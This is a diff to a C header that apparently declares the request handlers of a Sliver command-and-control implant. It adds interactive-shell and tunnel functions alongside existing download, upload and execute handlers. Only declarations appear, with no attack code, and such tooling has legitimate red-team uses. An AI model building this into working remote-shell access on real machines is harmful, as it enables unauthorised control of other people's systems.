@@ -16,6 +16,7 @@ extern "C" {
 /* Result of dispatching one request. */
 typedef struct {
   int handled;          /* 1 when a handler produced `message` */
+  int no_response;      /* 1 when the handler already replied itself */
   uint32_t resp_type;   /* message type of `message` */
   sliver_buf_t message; /* response payload, owned by the dispatcher */
 } sliver_rpc_result_t;
@@ -40,10 +41,20 @@ int sliver_rpc_handle_env(const sliver_envelope_t *req, sliver_buf_t *out);
 int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out);
 int sliver_rpc_handle_upload(const sliver_envelope_t *req, sliver_buf_t *out);
 int sliver_rpc_handle_execute(const sliver_envelope_t *req, sliver_buf_t *out);
+int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out);
+int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *out);
+int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *out);
+int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *out);
+
+/* Shell tunnel plumbing (used by the session to deliver peer data). */
+typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);
+void sliver_shell_set_sender(sliver_shell_send_fn fn);
+void sliver_shell_shutdown(void);
 
 #ifdef __cplusplus
 }
 #endif
 
 #endif /* SLIVER_RPC_H */
+
 
